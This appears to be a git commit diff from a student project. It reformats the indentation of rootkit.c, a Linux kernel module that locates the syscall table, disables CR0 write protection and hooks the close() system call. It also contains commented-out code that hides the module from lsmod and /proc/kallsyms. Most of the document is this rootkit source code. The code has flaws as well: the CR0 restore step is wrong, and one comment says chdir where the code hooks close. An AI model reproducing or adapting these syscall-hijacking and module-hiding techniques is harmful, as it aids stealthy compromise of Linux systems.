9463c14791a401cd01acf10c69e2d94984faeeea
Shivanshu Goswami <shivanshu.goswami@stonybrook.edu>
2016-11-15 22:09:47 -0500

    Fixing indentation

--- rootkit.c
+++ rootkit.c
@@ -9,85 +9,79 @@
 #define SYSCALL_TABLE_STOP 0xd0000000
 typedef unsigned int pointer_size_t;
 #else
-#define SYSCALL_TABLE_START 0xffffffff81000000l
-#define SYSCALL_TABLE_STOP 0xffffffffa2000000l
+#define SYSCALL_TABLE_START (unsigned long)0xffffffff81000000l
+#define SYSCALL_TABLE_STOP (unsigned long)0xffffffffa2000000l
 typedef unsigned long pointer_size_t;
 #endif
 
 unsigned long **syscall_table;
-
 asmlinkage int (*original_close)(int fd);
 
 asmlinkage int my_close(int fd)
 {
-	int err;
-	printk("Hijacked close call; fd: %d\n", fd);
-	err = original_close(fd);
-	return err;
+    int err;
+    printk("Hijacked close call; fd: %d\n", fd);
+    err = original_close(fd);
+    return err;
 }
 
 pointer_size_t **find_syscall_table(void)
 {
-	pointer_size_t i;
-	pointer_size_t **table;
-	for (i = SYSCALL_TABLE_START; i < SYSCALL_TABLE_STOP; i += sizeof(void *)) {
-		table = (pointer_size_t **) i;
-		if ( table[__NR_close] == (pointer_size_t *) sys_close)
-			return &table[0];
-	}
-	return NULL;
+    pointer_size_t i;
+    pointer_size_t **table;
+    for (i = SYSCALL_TABLE_START; i < SYSCALL_TABLE_STOP; i += sizeof(void *)) {
+        table = (pointer_size_t **) i;
+        if ( table[__NR_close] == (pointer_size_t *) sys_close)
+            return &table[0];
+    }
+    return NULL;
 }
-
-
-
 
 int rootkit_init(void)
 {
-	printk("Rootkit loaded\n");
-	
-	/* Uncomment the following lines after completion of module 
-	 * Can't rmmod it if we have it uncommented during dev
-	 * That's just cumbersome during dev
-	 */
-	
-	/*
-	// stop from showing on lsmod
-	list_del_init(&__this_module.list);
+    printk("Rootkit loaded\n");
 
-	// stop showing in /proc/kallsyms
-	kobject_del(&THIS_MODULE->mkobj.kobj);
-	*/
-	
-	syscall_table = find_syscall_table();
-	if (!syscall_table) {
-		goto out;	
-	}
+    /* Uncomment the following lines after completion of module
+     * Can't rmmod it if we have it uncommented during dev
+     * That's just cumbersome during dev
+     */
 
-	printk("Syscall table at %p\n", syscall_table);
-	
-	// make writable by disabling write protect
-	write_cr0(read_cr0() & (~0x10000));
+    /*
+    // stop from showing on lsmod
+    list_del_init(&__this_module.list);
 
-	// hijack chdir system call
-	original_close = (int (*)(int)) syscall_table[__NR_close];
-	syscall_table[__NR_close] = (void *) my_close;
+    // stop showing in /proc/kallsyms
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    */
 
-	// enable write protected
-	write_cr0(read_cr0() & 0x10000);
+    syscall_table = find_syscall_table();
+    if (!syscall_table) {
+        goto out;
+    }
 
+    printk("Syscall table at %p\n", syscall_table);
 
-	out:
-	return 0;
+    // make writable by disabling write protect
+    write_cr0(read_cr0() & (~0x10000));
+
+    // hijack chdir system call
+    original_close = (asmlinkage int (*)(int)) syscall_table[__NR_close];
+    syscall_table[__NR_close] = (void *) my_close;
+
+    // enable write protected
+    write_cr0(read_cr0() & 0x10000);
+
+out:
+    return 0;
 }
 
 void rootkit_exit(void)
 {
-	write_cr0(read_cr0() & (~0x10000));
-	syscall_table[__NR_close] = (void *) original_close;
-	write_cr0(read_cr0() & 0x10000);
-	printk("Rootkit unloaded\n");
+    write_cr0(read_cr0() & (~0x10000));
+    syscall_table[__NR_close] = (void *) original_close;
+    write_cr0(read_cr0() & 0x10000);
+    printk("Rootkit unloaded\n");
 }
-
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("BufferOverflowers");
